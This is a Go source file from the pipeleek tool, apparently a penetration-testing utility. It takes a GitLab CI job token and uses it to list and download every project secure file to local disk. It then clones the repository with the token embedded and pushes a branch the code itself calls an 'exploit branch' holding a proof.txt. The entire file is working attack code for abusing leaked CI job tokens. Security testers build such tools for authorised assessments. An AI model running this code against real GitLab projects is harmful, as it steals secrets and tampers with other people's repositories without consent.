package jobtoken

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	"net/url"
	"os"
	"os/exec"
	"path"
	"path/filepath"
	"strings"

	"github.com/CompassSecurity/pipeleek/pkg/httpclient"
	"github.com/rs/zerolog/log"
	gitlab "gitlab.com/gitlab-org/api/client-go"
)

const (
	defaultJobName       = "pipeleek-envs"
	defaultCommitMessage = "Add jobToken env dump job"
	branchPrefix         = "pipeleek-"
)

// Run executes the job token workflow for a project.
func Run(gitlabUrl, gitlabApiToken, projectPath string) {
	git, err := newJobTokenClient(gitlabUrl, gitlabApiToken)
	if err != nil {
		log.Fatal().Stack().Err(err).Msg("Failed creating gitlab client")
	}

	project := fetchProject(git, projectPath)
	logJobTokenContext(git, gitlabApiToken, project.PathWithNamespace)
	fetchAndLogSecureFiles(git, project.PathWithNamespace, gitlabApiToken)

	defaultBranch := project.DefaultBranch
	if defaultBranch == "" {
		log.Fatal().Msg("Project has no default branch")
	}

	branchName, err := generateBranchName()
	if err != nil {
		log.Fatal().Stack().Err(err).Msg("Failed to generate branch name")
	}

	if err := pushExploitBranch(project, gitlabApiToken, defaultBranch, branchName); err != nil {
		log.Warn().Stack().Str("branch", branchName).Msg("Could not write to the repo with this job token (this is often disabled by default)")
		return
	}

	log.Info().Str("project", project.WebURL).Str("branch", branchName).Str("job", defaultJobName).Msg("Created jobToken exploit branch")
	log.Info().Str("url", fmt.Sprintf("%s/-/tree/%s", project.WebURL, branchName)).Msg("Review branch changes")
}

func generateBranchName() (string, error) {
	randomBytes := make([]byte, 4)
	if _, err := rand.Read(randomBytes); err != nil {
		return "", err
	}

	return branchPrefix + hex.EncodeToString(randomBytes), nil
}

func newJobTokenClient(gitlabUrl, jobToken string) (*gitlab.Client, error) {
	client := httpclient.GetPipeleekHTTPClient("", nil, nil).StandardClient()
	baseURL, err := normalizeGitlabAPIBaseURL(gitlabUrl)
	if err != nil {
		return nil, err
	}

	return gitlab.NewJobClient(jobToken,
		gitlab.WithBaseURL(baseURL),
		gitlab.WithHTTPClient(client),
	)
}

func normalizeGitlabAPIBaseURL(rawURL string) (string, error) {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return "", err
	}

	cleanPath := strings.TrimRight(parsed.Path, "/")
	if !strings.HasSuffix(cleanPath, "/api/v4") {
		parsed.Path = path.Join(cleanPath, "api/v4")
	}

	return parsed.String(), nil
}

func fetchProject(git *gitlab.Client, projectPath string) *gitlab.Project {
	project, resp, err := git.Projects.GetProject(projectPath, &gitlab.GetProjectOptions{})
	if err != nil {
		log.Fatal().Stack().Err(err).Msg("Failed fetching project by repository name")
	}
	if resp.StatusCode == 404 {
		log.Fatal().Msg("Project not found")
	}

	log.Info().Msg("Job token validation succeeded")

	return project
}

func logJobTokenContext(git *gitlab.Client, token, projectPath string) {
	job, resp, err := git.Jobs.GetJobTokensJob(&gitlab.GetJobTokensJobOptions{
		JobToken: gitlab.Ptr(token),
	})
	if err != nil {
		status := 0
		if resp != nil {
			status = resp.StatusCode
		}
		log.Warn().Stack().Err(err).Int("status", status).Msg("Failed to resolve job token context")
		return
	}

	projectID := job.Pipeline.ProjectID
	if job.Project != nil && job.Project.ID != 0 {
		projectID = job.Project.ID
	}

	log.Info().
		Int64("job_id", job.ID).
		Int64("project_id", projectID).
		Str("project", projectPath).
		Str("ref", job.Ref).
		Str("status", job.Status).
		Str("web_url", job.WebURL).
		Msg("Job token context resolved")
}

func fetchAndLogSecureFiles(git *gitlab.Client, projectPath string, token string) {
	log.Info().Str("project", projectPath).Msg("Fetching secure files")

	listOpts := &gitlab.ListProjectSecureFilesOptions{
		ListOptions: gitlab.ListOptions{
			PerPage: 100,
			Page:    1,
		},
	}
	files, resp, err := git.SecureFiles.ListProjectSecureFiles(projectPath, listOpts)
	if err != nil {
		status := 0
		if resp != nil {
			status = resp.StatusCode
		}
		log.Fatal().Stack().Err(err).Int("status", status).Msg("Failed fetching secure files list")
	}

	if len(files) == 0 {
		log.Info().Msg("No secure files found")
		return
	}

	outputDir := "secure-files"
	if err := os.MkdirAll(outputDir, 0o700); err != nil {
		log.Fatal().Stack().Err(err).Str("dir", outputDir).Msg("Failed to create secure files output directory")
	}

	for _, file := range files {
		reader, resp, err := git.SecureFiles.DownloadSecureFile(projectPath, file.ID)
		if err != nil {
			status := 0
			if resp != nil {
				status = resp.StatusCode
			}
			log.Error().Stack().Err(err).Int64("file_id", file.ID).Int("status", status).Msg("Failed fetching secure file")
			continue
		}

		secureFile, err := io.ReadAll(reader)
		if err != nil {
			log.Error().Stack().Err(err).Int64("file_id", file.ID).Msg("Failed reading secure file")
			continue
		}

		outputPath := file.Name
		if outputPath == "" {
			outputPath = fmt.Sprintf("secure-file-%d", file.ID)
		}
		outputPath = filepath.Join(outputDir, outputPath)
		if err := os.WriteFile(outputPath, secureFile, 0o600); err != nil {
			log.Error().Stack().Err(err).Int64("file_id", file.ID).Str("path", outputPath).Msg("Failed writing secure file")
			continue
		}

		log.Info().Str("name", file.Name).Str("path", outputPath).Int64("bytes", int64(len(secureFile))).Msg("Saved secure file")
	}
}

func pushExploitBranch(project *gitlab.Project, jobToken, defaultBranch, branchName string) error {
	cloneURL := project.HTTPURLToRepo
	if cloneURL == "" {
		return fmt.Errorf("project clone URL is empty")
	}

	authURL, err := withJobTokenAuth(cloneURL, jobToken)
	if err != nil {
		return err
	}

	workDir, err := os.MkdirTemp("", "pipeleek-jobtoken-")
	if err != nil {
		return err
	}
	defer func() {
		_ = os.RemoveAll(workDir)
	}()

	if err := runGitCommand(workDir, jobToken, "clone", "--depth", "1", "--branch", defaultBranch, authURL, workDir); err != nil {
		return err
	}
	log.Debug().Str("dir", workDir).Str("branch", defaultBranch).Msg("Cloned repository")

	proofPath := filepath.Join(workDir, "proof.txt")
	proofContent := "Pipleek abused a job token üèÜ"
	if err := os.WriteFile(proofPath, []byte(proofContent), 0o644); err != nil {
		return fmt.Errorf("failed writing proof.txt: %w", err)
	}
	log.Debug().Str("path", proofPath).Msg("Wrote proof.txt")

	if err := runGitCommand(workDir, jobToken, "checkout", "-b", branchName); err != nil {
		return err
	}
	log.Debug().Str("branch", branchName).Msg("Checked out new branch")
	if err := runGitCommand(workDir, jobToken, "add", "proof.txt"); err != nil {
		return err
	}
	log.Debug().Str("file", "proof.txt").Msg("Staged proof.txt")
	if err := runGitCommand(workDir, jobToken, "-c", "user.name=pipeleek", "-c", "user.email=pipeleek@local", "commit", "-m", defaultCommitMessage); err != nil {
		return err
	}
	log.Debug().Str("message", defaultCommitMessage).Msg("Committed proof.txt")

	if err := runGitCommand(workDir, jobToken, "push", "origin", branchName); err != nil {
		return err
	}
	log.Debug().Str("branch", branchName).Msg("Pushed branch")

	return nil
}

func withJobTokenAuth(rawURL, jobToken string) (string, error) {
	parsed, err := url.Parse(rawURL)
	if err != nil {
		return "", err
	}
	parsed.User = url.UserPassword("gitlab-ci-token", jobToken)
	return parsed.String(), nil
}

func runGitCommand(dir, jobToken string, args ...string) error {
	cmd := exec.Command("git", args...)
	cmd.Dir = dir
	output, err := cmd.CombinedOutput()
	if err != nil {
		return fmt.Errorf("git %s failed: %w: %s", strings.Join(args, " "), err, scrubToken(string(output), jobToken))
	}

	return nil
}

func scrubToken(value, token string) string {
	if token == "" {
		return strings.TrimSpace(value)
	}
	return strings.TrimSpace(strings.ReplaceAll(value, token, "[REDACTED]"))
}
